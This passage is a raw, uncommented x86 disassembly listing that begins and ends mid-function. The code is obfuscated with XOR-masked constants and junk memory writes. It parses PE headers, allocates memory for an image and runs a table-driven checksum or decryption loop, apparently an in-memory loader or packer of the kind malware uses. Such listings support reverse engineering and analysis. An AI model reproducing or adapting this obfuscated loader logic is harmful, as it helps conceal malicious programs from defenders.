  422b2b:	xor    eax,eax
  422b2d:	mov    eax,DWORD PTR [ebp+0x8]
  422b30:	mov    ecx,DWORD PTR [ebp-0xc]
  422b33:	mov    BYTE PTR [eax+ecx*1],dl
  422b36:	mov    eax,DWORD PTR [ebp+0x8]
  422b39:	mov    ecx,DWORD PTR [ebp-0x10]
  422b3c:	sub    eax,edi
  422b3e:	xor    eax,esi
  422b40:	cmp    eax,ecx
  422b42:	jne    0x422b65
  422b44:	mov    eax,DWORD PTR [ebp+0x10]
  422b47:	mov    ecx,DWORD PTR [ebp+0xc]
  422b4a:	xor    eax,esi
  422b4c:	xor    ecx,esi
  422b4e:	sub    eax,ecx
  422b50:	mov    ecx,DWORD PTR [ebp-0x20]
  422b53:	sub    eax,edi
  422b55:	xor    eax,esi
  422b57:	mov    DWORD PTR [ebp+0x10],eax
  422b5a:	mov    eax,DWORD PTR [ebp+0xc]
  422b5d:	xor    eax,esi
  422b5f:	sub    ecx,eax
  422b61:	sub    ecx,edi
  422b63:	jmp    0x422b74
  422b65:	mov    eax,DWORD PTR [ebp+0xc]
  422b68:	xor    eax,esi
  422b6a:	mov    ecx,0xffcd8d06
  422b6f:	sub    ecx,eax
  422b71:	add    ecx,DWORD PTR [ebp+0x8]
  422b74:	mov    DWORD PTR [ebp+0x8],ecx
  422b77:	mov    eax,DWORD PTR [ebp+0x10]
  422b7a:	cmp    eax,ebx
  422b7c:	jne    0x422a7a
  422b82:	mov    eax,DWORD PTR [ebp-0x24]
  422b85:	jmp    0x422b8a
  422b87:	mov    eax,DWORD PTR [ebp-0x4]
  422b8a:	xor    eax,esi
  422b8c:	add    eax,edi
  422b8e:	pop    edi
  422b8f:	pop    esi
  422b90:	pop    ebx
  422b91:	leave  
  422b92:	ret    0xc
  422b95:	push   ebp
  422b96:	mov    ebp,esp
  422b98:	sub    esp,0x420
  422b9e:	mov    DWORD PTR [ebp-0x14],0xf89c85b5
  422ba5:	mov    DWORD PTR [ebp-0xc],0xf89c85b4
  422bac:	mov    DWORD PTR [ebp-0x18],0xf89c86b5
  422bb3:	push   ebx
  422bb4:	mov    DWORD PTR [ebp-0x1c],0xf89c85b6
  422bbb:	mov    eax,DWORD PTR [ebp-0x14]
  422bbe:	push   esi
  422bbf:	mov    esi,0x75108b3
  422bc4:	push   edi
  422bc5:	xor    eax,esi
  422bc7:	mov    edi,0x3272fa
  422bcc:	add    eax,edi
  422bce:	mov    DWORD PTR [ebp-0x8],eax
  422bd1:	mov    DWORD PTR [ebp-0x20],0xf89c85bd
  422bd8:	mov    DWORD PTR [ebp-0x4],0xead71895
  422bdf:	mov    DWORD PTR [ebp-0x10],0x8
  422be6:	mov    ecx,ecx
  422be8:	mov    eax,DWORD PTR [ebp-0xc]
  422beb:	mov    ecx,DWORD PTR [ebp-0x14]
  422bee:	xor    eax,esi
  422bf0:	xor    ecx,esi
  422bf2:	add    eax,edi
  422bf4:	add    ecx,edi
  422bf6:	imul   eax,ecx
  422bf9:	jmp    0x422c2c
  422bfb:	mov    eax,DWORD PTR [ebp-0x4]
  422bfe:	sub    eax,edi
  422c00:	xor    eax,esi
  422c02:	mov    DWORD PTR [ebp-0x8],eax
  422c05:	lea    ebx,[ebp-0x8]
  422c08:	call   0x42294d
  422c0d:	mov    DWORD PTR [ebp-0x8],eax
  422c10:	mov    eax,DWORD PTR [ebp-0x8]
  422c13:	mov    ecx,DWORD PTR [ebp-0x4]
  422c16:	mov    DWORD PTR [ebp+ecx*4-0x420],eax
  422c1d:	mov    eax,DWORD PTR [ebp-0xc]
  422c20:	mov    ecx,DWORD PTR [ebp-0x4]
  422c23:	xor    eax,esi
  422c25:	lea    eax,[eax+ecx*1+0x3272fa]
  422c2c:	mov    DWORD PTR [ebp-0x4],eax
  422c2f:	mov    eax,DWORD PTR [ebp-0x18]
  422c32:	mov    ecx,DWORD PTR [ebp-0xc]
  422c35:	xor    ecx,esi
  422c37:	xor    eax,esi
  422c39:	sub    eax,ecx
  422c3b:	mov    ecx,DWORD PTR [ebp-0x4]
  422c3e:	cmp    ecx,eax
  422c40:	jbe    0x422bfb
  422c42:	mov    eax,DWORD PTR [ebp-0x1c]
  422c45:	xor    eax,esi
  422c47:	add    eax,edi
  422c49:	mov    DWORD PTR [ebp-0x8],eax
  422c4c:	mov    DWORD PTR [ebp-0x18],0xf89c86b6
  422c53:	mov    ebx,ebx
  422c55:	jmp    0x422cb8
  422c57:	mov    ecx,DWORD PTR [ebp-0x20]
  422c5a:	mov    eax,DWORD PTR [ebp-0x8]
  422c5d:	xor    ecx,esi
  422c5f:	add    ecx,edi
  422c61:	shr    eax,cl
  422c63:	mov    DWORD PTR [ebp-0x4],eax
  422c66:	mov    eax,DWORD PTR [ebp+0x8]
  422c69:	mov    cl,BYTE PTR [eax]
  422c6b:	mov    BYTE PTR [ebp+0xb],cl
  422c6e:	mov    cl,BYTE PTR [ebp+0xb]
  422c71:	mov    edx,DWORD PTR [ebp-0x8]
  422c74:	movzx  ecx,cl
  422c77:	xor    ecx,edx
  422c79:	mov    DWORD PTR [ebp+0x8],ecx
  422c7c:	mov    ecx,DWORD PTR [ebp-0x18]
  422c7f:	mov    edx,DWORD PTR [ebp+0x8]
  422c82:	xor    ecx,esi
  422c84:	add    ecx,edi
  422c86:	and    ecx,edx
  422c88:	mov    ecx,DWORD PTR [ebp+ecx*4-0x420]
  422c8f:	mov    edx,DWORD PTR [ebp-0x4]
  422c92:	xor    ecx,edx
  422c94:	mov    DWORD PTR [ebp-0x8],ecx
  422c97:	mov    ecx,DWORD PTR [ebp-0xc]
  422c9a:	xor    ecx,esi
  422c9c:	lea    eax,[eax+ecx*1+0x3272fa]
  422ca3:	mov    DWORD PTR [ebp+0x8],eax
  422ca6:	mov    eax,DWORD PTR [ebp-0xc]
  422ca9:	xor    eax,esi
  422cab:	mov    ecx,0xffcd8d06
  422cb0:	sub    ecx,eax
  422cb2:	add    ecx,DWORD PTR [ebp-0x10]
  422cb5:	mov    DWORD PTR [ebp-0x10],ecx
  422cb8:	mov    eax,DWORD PTR [ebp-0x14]
  422cbb:	mov    ecx,DWORD PTR [ebp-0x10]
  422cbe:	xor    eax,esi
  422cc0:	add    eax,edi
  422cc2:	cmp    ecx,eax
  422cc4:	jne    0x422c57
  422cc6:	mov    eax,DWORD PTR [ebp-0x1c]
  422cc9:	mov    ecx,DWORD PTR [ebp-0x8]
  422ccc:	xor    eax,esi
  422cce:	add    eax,edi
  422cd0:	pop    edi
  422cd1:	pop    esi
  422cd2:	xor    eax,ecx
  422cd4:	pop    ebx
  422cd5:	leave  
  422cd6:	ret    0x4
  422cd9:	push   ebp
  422cda:	mov    ebp,esp
  422cdc:	mov    eax,DWORD PTR [ebp+0x1c]
  422cdf:	mov    ecx,DWORD PTR [ebp+0x8]
  422ce2:	mov    edx,DWORD PTR [ebp+0x10]
  422ce5:	mov    eax,DWORD PTR [eax+0x190]
  422ceb:	mov    eax,DWORD PTR [eax]
  422ced:	sub    esp,0x64
  422cf0:	push   ebx
  422cf1:	push   esi
  422cf2:	push   edi
  422cf3:	mov    edi,0x75108b3
  422cf8:	xor    ecx,edi
  422cfa:	mov    ebx,0x3272fa
  422cff:	add    ecx,ebx
  422d01:	cmp    ecx,edx
  422d03:	jne    0x422d14
  422d05:	or     DWORD PTR ds:0x3750c3f,0x4263ebce
  422d0f:	jmp    0x423210
  422d14:	mov    ecx,DWORD PTR [ebp+0x8]
  422d17:	mov    esi,DWORD PTR [ebp+0x14]
  422d1a:	mov    edx,DWORD PTR [esi]
  422d1c:	xor    ecx,edi
  422d1e:	add    ecx,ebx
  422d20:	cmp    edx,ecx
  422d22:	je     0x4231cb
  422d28:	mov    ecx,DWORD PTR [ebp+0x1c]
  422d2b:	mov    DWORD PTR [ebp-0x1c],eax
  422d2e:	mov    DWORD PTR [ebp+0x1c],ecx
  422d31:	mov    ecx,DWORD PTR [ebp+0x18]
  422d34:	mov    eax,DWORD PTR [esi]
  422d36:	mov    DWORD PTR [ebp-0x20],eax
  422d39:	mov    DWORD PTR [ebp+0x8],0xf89c85b5
  422d40:	mov    edx,0xf89c85b4
  422d45:	mov    DWORD PTR [ebp-0x8],edx
  422d48:	mov    eax,DWORD PTR [ebp+0x1c]
  422d4b:	mov    DWORD PTR [ebp+0x1c],eax
  422d4e:	mov    eax,DWORD PTR [ebp+0x1c]
  422d51:	mov    eax,DWORD PTR [eax+0x190]
  422d57:	mov    eax,DWORD PTR [eax]
  422d59:	mov    DWORD PTR [ebp-0x24],ecx
  422d5c:	mov    ecx,DWORD PTR [ebp+0x1c]
  422d5f:	mov    ecx,DWORD PTR [ecx+0x190]
  422d65:	mov    ecx,DWORD PTR [ecx]
  422d67:	add    ecx,DWORD PTR [eax+0x3c]
  422d6a:	mov    DWORD PTR [ebp+0x10],ecx
  422d6d:	mov    eax,DWORD PTR [ebp+0x8]
  422d70:	xor    eax,edi
  422d72:	add    eax,ebx
  422d74:	mov    DWORD PTR [ebp-0x4],eax
  422d77:	mov    eax,DWORD PTR [ebp+0x8]
  422d7a:	xor    eax,edi
  422d7c:	add    eax,ebx
  422d7e:	mov    DWORD PTR [ebp+0x18],eax
  422d81:	mov    eax,DWORD PTR [ebp+0x10]
  422d84:	mov    eax,DWORD PTR [eax+0x50]
  422d87:	sub    eax,0xc
  422d8a:	mov    DWORD PTR [ebp-0x28],eax
  422d8d:	mov    eax,DWORD PTR [ebp+0x10]
  422d90:	mov    eax,DWORD PTR [eax+0x38]
  422d93:	mov    ecx,DWORD PTR [ebp+0x10]
  422d96:	dec    eax
  422d97:	test   DWORD PTR [ecx+0x54],eax
  422d9a:	mov    eax,DWORD PTR [ebp+0x10]
  422d9d:	je     0x422db7
  422d9f:	mov    eax,DWORD PTR [eax+0x38]
  422da2:	mov    ecx,DWORD PTR [ebp+0x10]
  422da5:	mov    ecx,DWORD PTR [ecx+0x54]
  422da8:	dec    eax
  422da9:	not    eax
  422dab:	and    ecx,eax
  422dad:	mov    eax,DWORD PTR [ebp+0x10]
  422db0:	mov    eax,DWORD PTR [eax+0x38]
  422db3:	add    eax,ecx
  422db5:	jmp    0x422dba
  422db7:	mov    eax,DWORD PTR [eax+0x54]
  422dba:	mov    DWORD PTR [ebp+0x1c],eax
  422dbd:	mov    eax,DWORD PTR [ebp+0x8]
  422dc0:	xor    eax,edi
  422dc2:	add    eax,ebx
  422dc4:	mov    DWORD PTR [ebp+0x18],eax
  422dc7:	mov    eax,DWORD PTR [ebp+0x8]
  422dca:	xor    eax,edi
  422dcc:	add    eax,ebx
  422dce:	mov    DWORD PTR [ebp+0x18],eax
  422dd1:	mov    eax,DWORD PTR [ebp+0x8]
  422dd4:	mov    ecx,DWORD PTR [ebp-0x24]
  422dd7:	xor    eax,edi
  422dd9:	add    eax,ebx
  422ddb:	mov    DWORD PTR [ecx],eax
  422ddd:	mov    DWORD PTR [ebp+0x18],edx
  422de0:	mov    DWORD PTR [ebp+0x18],0xf89c85bb
  422de7:	mov    DWORD PTR [ebp+0x18],0xf89c85ba
  422dee:	mov    DWORD PTR [ebp+0x18],0xf89c85b9
  422df5:	mov    eax,DWORD PTR [ebp-0x8]
  422df8:	mov    ecx,DWORD PTR [ebp+0x1c]
  422dfb:	xor    eax,edi
  422dfd:	add    eax,ebx
  422dff:	imul   eax,ecx
  422e02:	mov    ecx,DWORD PTR [ebp+0x8]
  422e05:	mov    edx,DWORD PTR [ebp-0x28]
  422e08:	xor    ecx,edi
  422e0a:	lea    ecx,[ecx+edx*1+0x3272fa]
  422e11:	cmp    eax,ecx
  422e13:	jae    0x4231c4
  422e19:	mov    eax,DWORD PTR [ebp+0x8]
  422e1c:	xor    eax,edi
  422e1e:	add    eax,ebx
  422e20:	mov    DWORD PTR [ebp+0x18],eax
  422e23:	mov    eax,DWORD PTR [ebp+0x1c]
  422e26:	add    eax,DWORD PTR [ebp-0x1c]
  422e29:	mov    DWORD PTR [ebp-0x4],eax
  422e2c:	push   DWORD PTR [ebp-0x4]
  422e2f:	mov    esi,DWORD PTR [ebp-0x1c]
  422e32:	mov    ecx,DWORD PTR [ebp+0x10]
  422e35:	call   0x421f85
  422e3a:	mov    DWORD PTR [ebp+0xc],eax
  422e3d:	mov    DWORD PTR [ebp-0x18],0xf89c85bd
  422e44:	mov    eax,DWORD PTR [ebp-0x18]
  422e47:	xor    eax,edi
  422e49:	lea    ecx,[ebp-0x40]
  422e4c:	add    eax,ebx
  422e4e:	push   ecx
  422e4f:	call   0x422519
  422e54:	mov    eax,DWORD PTR [ebp+0xc]
  422e57:	test   eax,eax
  422e59:	je     0x422ea9
  422e5b:	mov    eax,DWORD PTR [ebp-0x18]
  422e5e:	xor    eax,edi
  422e60:	add    eax,ebx
  422e62:	push   eax
  422e63:	push   DWORD PTR [ebp+0xc]
  422e66:	lea    eax,[ebp-0x40]
  422e69:	push   eax
  422e6a:	call   0x42240f
  422e6f:	mov    eax,DWORD PTR [ebp-0x4]
  422e72:	mov    DWORD PTR [ebp-0x18],eax
  422e75:	mov    eax,DWORD PTR [ebp-0x18]
  422e78:	mov    ecx,DWORD PTR [ebp-0x1c]
  422e7b:	sub    eax,ecx
  422e7d:	mov    DWORD PTR [ebp-0x18],eax
  422e80:	mov    eax,DWORD PTR [ebp+0xc]
  422e83:	mov    ecx,DWORD PTR [ebp+0xc]
  422e86:	mov    eax,DWORD PTR [eax+0x10]
  422e89:	add    eax,DWORD PTR [ecx+0xc]
  422e8c:	mov    ecx,DWORD PTR [ebp-0x18]
  422e8f:	cmp    ecx,eax
  422e91:	jb     0x422ea9
  422e93:	mov    eax,DWORD PTR [ebp+0xc]
  422e96:	mov    eax,DWORD PTR [eax+0xc]
  422e99:	mov    ecx,DWORD PTR [ebp+0xc]
  422e9c:	add    eax,DWORD PTR [ecx+0x8]
  422e9f:	mov    ecx,DWORD PTR [ebp-0x18]
  422ea2:	sub    eax,ecx
  422ea4:	jmp    0x423197
  422ea9:	push   0xc
  422eab:	push   DWORD PTR [ebp-0x4]
  422eae:	lea    eax,[ebp-0x4c]
  422eb1:	push   eax
  422eb2:	call   0x42240f
  422eb7:	mov    eax,0xf89c85b5
  422ebc:	mov    DWORD PTR [ebp-0x2c],eax
  422ebf:	mov    DWORD PTR [ebp-0x30],0xf89c85b4
  422ec6:	mov    DWORD PTR [ebp-0x34],0xf89c85bb
  422ecd:	mov    DWORD PTR [ebp-0x38],0xf89c85ba
  422ed4:	lea    ecx,[ebp-0x2c]
  422ed7:	mov    DWORD PTR [ebp-0xc],ecx
  422eda:	lea    ecx,[ebp-0x30]
  422edd:	mov    DWORD PTR [ebp-0x10],ecx
  422ee0:	lea    ecx,[ebp-0x34]
  422ee3:	mov    DWORD PTR [ebp+0xc],ecx
  422ee6:	lea    ecx,[ebp-0x38]
  422ee9:	mov    DWORD PTR [ebp-0x14],ecx
  422eec:	mov    ecx,DWORD PTR [ebp+0x8]
  422eef:	xor    ecx,edi
  422ef1:	add    ecx,ebx
  422ef3:	mov    DWORD PTR [ebp-0x18],ecx
  422ef6:	jmp    0x4230f2
  422efb:	cmp    eax,0xf89c85bb
  422f00:	je     0x423104
  422f06:	mov    ecx,DWORD PTR [ebp-0x8]
  422f09:	xor    ecx,edi
  422f0b:	mov    esi,eax
  422f0d:	add    ecx,ebx
  422f0f:	mov    DWORD PTR [ebp+0x18],ecx
  422f12:	mov    eax,DWORD PTR [ebp-0x18]
  422f15:	xor    esi,edi
  422f17:	lea    eax,[eax+esi*1+0x3272fa]
  422f1e:	mov    DWORD PTR [ebp-0x18],eax
  422f21:	mov    eax,DWORD PTR [ebp-0x8]
  422f24:	mov    ecx,DWORD PTR [ebp-0x18]
  422f27:	xor    eax,edi
  422f29:	add    eax,ebx
  422f2b:	cmp    ecx,eax
  422f2d:	jne    0x422f42
  422f2f:	mov    eax,DWORD PTR [ebp+0x8]
  422f32:	xor    eax,edi
  422f34:	add    eax,ebx
  422f36:	push   eax
  422f37:	push   0xc
  422f39:	lea    eax,[ebp-0x4c]
  422f3c:	push   eax
  422f3d:	call   0x4229f5
  422f42:	mov    eax,DWORD PTR [ebp-0xc]
  422f45:	mov    eax,DWORD PTR [eax]
  422f47:	xor    eax,edi
  422f49:	mov    al,BYTE PTR [ebp+eax*1+0x3272ae]
  422f50:	mov    ecx,DWORD PTR [ebp+0x8]
  422f53:	xor    ecx,edi
  422f55:	movzx  eax,al
  422f58:	add    ecx,ebx
  422f5a:	cmp    eax,ecx
  422f5c:	je     0x4230da
  422f62:	mov    eax,DWORD PTR [ebp-0x10]
  422f65:	mov    eax,DWORD PTR [eax]
  422f67:	xor    eax,edi
  422f69:	mov    al,BYTE PTR [ebp+eax*1+0x3272ae]
  422f70:	mov    ecx,DWORD PTR [ebp+0x8]
  422f73:	xor    ecx,edi
  422f75:	movzx  eax,al
  422f78:	add    ecx,ebx
  422f7a:	cmp    eax,ecx
  422f7c:	je     0x4230da
  422f82:	mov    eax,DWORD PTR [ebp+0xc]
  422f85:	mov    eax,DWORD PTR [eax]
  422f87:	xor    eax,edi
  422f89:	mov    al,BYTE PTR [ebp+eax*1+0x3272ae]
  422f90:	mov    ecx,DWORD PTR [ebp+0x8]
  422f93:	xor    ecx,edi
  422f95:	movzx  eax,al
  422f98:	add    ecx,ebx
  422f9a:	cmp    eax,ecx
  422f9c:	je     0x4230da
  422fa2:	mov    eax,DWORD PTR [ebp-0x14]
  422fa5:	mov    eax,DWORD PTR [eax]
  422fa7:	xor    eax,edi
  422fa9:	mov    al,BYTE PTR [ebp+eax*1+0x3272ae]
  422fb0:	mov    ecx,DWORD PTR [ebp+0x8]
  422fb3:	xor    ecx,edi
  422fb5:	movzx  eax,al
  422fb8:	add    ecx,ebx
  422fba:	cmp    eax,ecx
  422fbc:	je     0x4230da
  422fc2:	mov    eax,DWORD PTR [ebp-0x10]
  422fc5:	mov    eax,DWORD PTR [eax]
  422fc7:	xor    eax,edi
  422fc9:	mov    al,BYTE PTR [ebp+eax*1+0x3272ae]
  422fd0:	mov    ecx,DWORD PTR [ebp-0xc]
  422fd3:	mov    ecx,DWORD PTR [ecx]
  422fd5:	xor    ecx,edi
  422fd7:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272ae]
  422fde:	xor    al,cl
  422fe0:	mov    ecx,DWORD PTR [ebp+0xc]
  422fe3:	mov    ecx,DWORD PTR [ecx]
  422fe5:	xor    ecx,edi
  422fe7:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272ae]
  422fee:	or     al,cl
  422ff0:	mov    ecx,DWORD PTR [ebp-0xc]
  422ff3:	mov    ecx,DWORD PTR [ecx]
  422ff5:	xor    ecx,edi
  422ff7:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272b2]
  422ffe:	cmp    cl,al
  423000:	jne    0x4230da
  423006:	mov    eax,DWORD PTR [ebp+0xc]
  423009:	mov    eax,DWORD PTR [eax]
  42300b:	xor    eax,edi
  42300d:	mov    al,BYTE PTR [ebp+eax*1+0x3272ae]
  423014:	mov    ecx,DWORD PTR [ebp-0x10]
  423017:	mov    ecx,DWORD PTR [ecx]
  423019:	xor    ecx,edi
  42301b:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272ae]
  423022:	xor    al,cl
  423024:	mov    ecx,DWORD PTR [ebp-0x14]
  423027:	mov    ecx,DWORD PTR [ecx]
  423029:	xor    ecx,edi
  42302b:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272ae]
  423032:	or     al,cl
  423034:	mov    ecx,DWORD PTR [ebp-0x10]
  423037:	mov    ecx,DWORD PTR [ecx]
  423039:	xor    ecx,edi
  42303b:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272b2]
  423042:	cmp    cl,al
  423044:	jne    0x4230da
  42304a:	mov    eax,DWORD PTR [ebp-0x14]
  42304d:	mov    eax,DWORD PTR [eax]
  42304f:	xor    eax,edi
  423051:	mov    al,BYTE PTR [ebp+eax*1+0x3272ae]
  423058:	mov    ecx,DWORD PTR [ebp+0xc]
  42305b:	mov    ecx,DWORD PTR [ecx]
  42305d:	xor    ecx,edi
  42305f:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272ae]
  423066:	xor    al,cl
  423068:	mov    ecx,DWORD PTR [ebp-0xc]
  42306b:	mov    ecx,DWORD PTR [ecx]
  42306d:	xor    ecx,edi
  42306f:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272ae]
  423076:	or     al,cl
  423078:	mov    ecx,DWORD PTR [ebp+0xc]
  42307b:	mov    ecx,DWORD PTR [ecx]
  42307d:	xor    ecx,edi
  42307f:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272b2]
  423086:	cmp    cl,al
  423088:	jne    0x4230da
  42308a:	mov    eax,DWORD PTR [ebp-0x14]
  42308d:	mov    eax,DWORD PTR [eax]
  42308f:	xor    eax,edi
  423091:	mov    al,BYTE PTR [ebp+eax*1+0x3272ae]
  423098:	mov    ecx,DWORD PTR [ebp-0xc]
  42309b:	mov    ecx,DWORD PTR [ecx]
  42309d:	xor    ecx,edi
  42309f:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272ae]
  4230a6:	xor    al,cl
  4230a8:	mov    ecx,DWORD PTR [ebp-0x10]
  4230ab:	mov    ecx,DWORD PTR [ecx]
  4230ad:	xor    ecx,edi
  4230af:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272ae]
  4230b6:	or     al,cl
  4230b8:	mov    ecx,DWORD PTR [ebp-0x14]
  4230bb:	mov    ecx,DWORD PTR [ecx]
  4230bd:	xor    ecx,edi
  4230bf:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272b2]
  4230c6:	cmp    cl,al
  4230c8:	jne    0x4230da
  4230ca:	lea    eax,[ebp-0x4c]
  4230cd:	push   eax
  4230ce:	call   0x422b95
  4230d3:	mov    ecx,DWORD PTR [ebp-0x44]
  4230d6:	cmp    eax,ecx
  4230d8:	je     0x4230e4
  4230da:	mov    eax,DWORD PTR [ebp+0x8]
  4230dd:	xor    eax,edi
  4230df:	add    eax,ebx
  4230e1:	mov    DWORD PTR [ebp+0x18],eax
  4230e4:	mov    eax,DWORD PTR [ebp-0x8]
  4230e7:	xor    eax,edi
  4230e9:	lea    eax,[eax+esi*1+0x3272fa]
  4230f0:	xor    eax,edi
  4230f2:	mov    ecx,DWORD PTR [ebp+0x8]
  4230f5:	mov    edx,DWORD PTR [ebp+0x18]
  4230f8:	xor    ecx,edi
  4230fa:	add    ecx,ebx
  4230fc:	cmp    edx,ecx
  4230fe:	je     0x422efb
  423104:	mov    eax,DWORD PTR [ebp+0x8]
  423107:	mov    ecx,DWORD PTR [ebp+0x18]
  42310a:	xor    eax,edi
  42310c:	add    eax,ebx
  42310e:	cmp    ecx,eax
  423110:	jne    0x423123
  423112:	mov    eax,DWORD PTR [ebp-0x8]
  423115:	mov    ecx,DWORD PTR [ebp+0x1c]
  423118:	xor    eax,edi
  42311a:	lea    eax,[eax+ecx*1+0x3272fa]
  423121:	jmp    0x42319a
  423123:	push   0x18
  423125:	push   DWORD PTR [ebp-0x4]
  423128:	lea    eax,[ebp-0x64]
  42312b:	push   eax
  42312c:	call   0x42240f
  423131:	mov    eax,DWORD PTR [ebp+0x8]
  423134:	mov    ecx,DWORD PTR [ebp-0x18]
  423137:	xor    eax,edi
  423139:	add    eax,ebx
  42313b:	cmp    eax,ecx
  42313d:	je     0x423152
  42313f:	mov    eax,DWORD PTR [ebp+0x8]
  423142:	xor    eax,edi
  423144:	add    eax,ebx
  423146:	push   eax
  423147:	push   0x18
  423149:	lea    eax,[ebp-0x64]
  42314c:	push   eax
  42314d:	call   0x4229f5
  423152:	mov    eax,DWORD PTR [ebp-0x4]
  423155:	add    eax,0x18
  423158:	mov    DWORD PTR [ebp+0x18],eax
  42315b:	push   DWORD PTR [ebp-0x50]
  42315e:	push   DWORD PTR [ebp+0x18]
  423161:	mov    eax,DWORD PTR [ebp-0x54]
  423164:	add    eax,DWORD PTR [ebp-0x20]
  423167:	push   eax
  423168:	call   0x42240f
  42316d:	mov    eax,DWORD PTR [ebp+0x8]
  423170:	mov    ecx,DWORD PTR [ebp-0x18]
  423173:	xor    eax,edi
  423175:	add    eax,ebx
  423177:	cmp    eax,ecx
  423179:	je     0x42318c
  42317b:	push   0x0
  42317d:	push   DWORD PTR [ebp-0x50]
  423180:	mov    eax,DWORD PTR [ebp-0x54]
  423183:	add    eax,DWORD PTR [ebp-0x20]
  423186:	push   eax
  423187:	call   0x4229f5
  42318c:	mov    eax,DWORD PTR [ebp-0x24]
  42318f:	mov    ecx,DWORD PTR [ebp-0x50]
  423192:	add    DWORD PTR [eax],ecx
  423194:	mov    eax,DWORD PTR [ebp-0x50]
  423197:	add    eax,DWORD PTR [ebp+0x1c]
  42319a:	mov    DWORD PTR [ebp+0x1c],eax
  42319d:	mov    eax,DWORD PTR [ebp-0x8]
  4231a0:	mov    ecx,DWORD PTR [ebp+0x1c]
  4231a3:	xor    eax,edi
  4231a5:	add    eax,ebx
  4231a7:	imul   eax,ecx
  4231aa:	mov    ecx,DWORD PTR [ebp+0x8]
  4231ad:	mov    edx,DWORD PTR [ebp-0x28]
  4231b0:	xor    ecx,edi
  4231b2:	lea    ecx,[ecx+edx*1+0x3272fa]
  4231b9:	cmp    eax,ecx
  4231bb:	jb     0x422e19
  4231c1:	mov    esi,DWORD PTR [ebp+0x14]
  4231c4:	mov    eax,DWORD PTR [ebp-0x20]
  4231c7:	mov    DWORD PTR [esi],eax
  4231c9:	jmp    0x423210
  4231cb:	mov    ecx,DWORD PTR [ebp+0x8]
  4231ce:	mov    edx,DWORD PTR [ebp+0xc]
  4231d1:	xor    ecx,edi
  4231d3:	xor    edx,edi
  4231d5:	add    ecx,ebx
  4231d7:	add    edx,ebx
  4231d9:	cmp    ecx,edx
  4231db:	jne    0x4231ef
  4231dd:	mov    eax,ds:0x7f642dde
  4231e2:	imul   eax,eax,0x9f15fcef
  4231e8:	mov    ds:0x7f642dde,eax
  4231ed:	jmp    0x423210
  4231ef:	mov    ecx,DWORD PTR [ebp+0x8]
  4231f2:	xor    ecx,edi
  4231f4:	add    ecx,ebx
  4231f6:	cmp    eax,ecx
  4231f8:	je     0x423206
  4231fa:	sub    DWORD PTR ds:0xf861e3e,0x709beac2
  423204:	jmp    0x423210
  423206:	and    DWORD PTR ds:0x3343fade,0x5265ec3f
  423210:	pop    edi
  423211:	pop    esi
  423212:	pop    ebx
  423213:	leave  
  423214:	ret    0x18
  423217:	push   ebp
  423218:	mov    ebp,esp
  42321a:	and    esp,0xfffffff8
  42321d:	mov    eax,DWORD PTR [ebp+0x20]
  423220:	sub    esp,0x14
  423223:	push   ebx
  423224:	mov    ebx,DWORD PTR [ebp+0x14]
  423227:	push   esi
  423228:	push   edi
  423229:	cmp    eax,0xf89c85b5
  42322e:	jne    0x42323a
  423230:	push   0xf89c85b4
  423235:	jmp    0x42336c
  42323a:	mov    eax,DWORD PTR [ebp+0x20]
  42323d:	cmp    eax,0xf89c85b4
  423242:	jne    0x42324e
  423244:	push   0xf89c85bb
  423249:	jmp    0x42336c
  42324e:	mov    eax,DWORD PTR [ebp+0x20]
  423251:	cmp    eax,0xf89c85bb
  423256:	jne    0x423262
  423258:	push   0xf89c85ba
  42325d:	jmp    0x42336c
  423262:	mov    eax,DWORD PTR [ebp+0x20]
  423265:	cmp    eax,0xf89c85ba
  42326a:	jne    0x423276
  42326c:	push   0xf89c85b9
  423271:	jmp    0x42336c
  423276:	mov    ecx,DWORD PTR [ebp+0x20]
  423279:	mov    eax,0xf89c85be
  42327e:	cmp    ecx,eax
  423280:	jne    0x42333c
  423286:	mov    eax,DWORD PTR [ebp+0x10]
  423289:	mov    DWORD PTR [esp+0xc],eax
  42328d:	mov    eax,DWORD PTR [ebp+0x18]
  423290:	mov    DWORD PTR [esp+0x14],eax
  423294:	mov    eax,DWORD PTR [ebp+0xc]
  423297:	mov    DWORD PTR [esp+0x18],eax
  42329b:	mov    eax,DWORD PTR [ebp+0x8]
  42329e:	mov    DWORD PTR [esp+0x10],eax
  4232a2:	mov    eax,DWORD PTR [esp+0x10]
  4232a6:	mov    ecx,DWORD PTR [esp+0x14]
  4232aa:	mov    edi,0x75108b3
  4232af:	xor    eax,edi
  4232b1:	mov    esi,0x3272fa
  4232b6:	add    eax,esi
  4232b8:	mov    DWORD PTR [ecx],eax
  4232ba:	mov    eax,DWORD PTR [esp+0xc]
  4232be:	mov    eax,DWORD PTR [eax+0x194]
  4232c4:	mov    ecx,DWORD PTR [eax]
  4232c6:	mov    eax,DWORD PTR [esp+0xc]
  4232ca:	mov    eax,DWORD PTR [eax+0x194]
  4232d0:	mov    eax,DWORD PTR [eax]
  4232d2:	add    eax,DWORD PTR [ecx+0x3c]
  4232d5:	mov    ecx,DWORD PTR [esp+0xc]
  4232d9:	mov    ecx,DWORD PTR [ecx+0x1e0]
  4232df:	mov    ecx,DWORD PTR [ecx+0x14]
  4232e2:	push   0x4
  4232e4:	push   0x3000
  4232e9:	push   DWORD PTR [eax+0x50]
  4232ec:	push   0x0
  4232ee:	call   ecx
  4232f0:	mov    DWORD PTR [ebx],eax
  4232f2:	mov    eax,DWORD PTR [esp+0x10]
  4232f6:	push   DWORD PTR [esp+0xc]
  4232fa:	xor    eax,edi
  4232fc:	add    eax,esi
  4232fe:	mov    DWORD PTR [esp+0x20],eax
  423302:	lea    eax,[esp+0x20]
  423306:	push   eax
  423307:	push   ebx
  423308:	push   DWORD PTR [esp+0x20]
  42330c:	push   DWORD PTR [esp+0x28]
  423310:	push   DWORD PTR [esp+0x24]
  423314:	call   0x422cd9
  423319:	mov    eax,DWORD PTR [esp+0x10]
  42331d:	mov    ecx,DWORD PTR [ebx]
  42331f:	xor    eax,edi
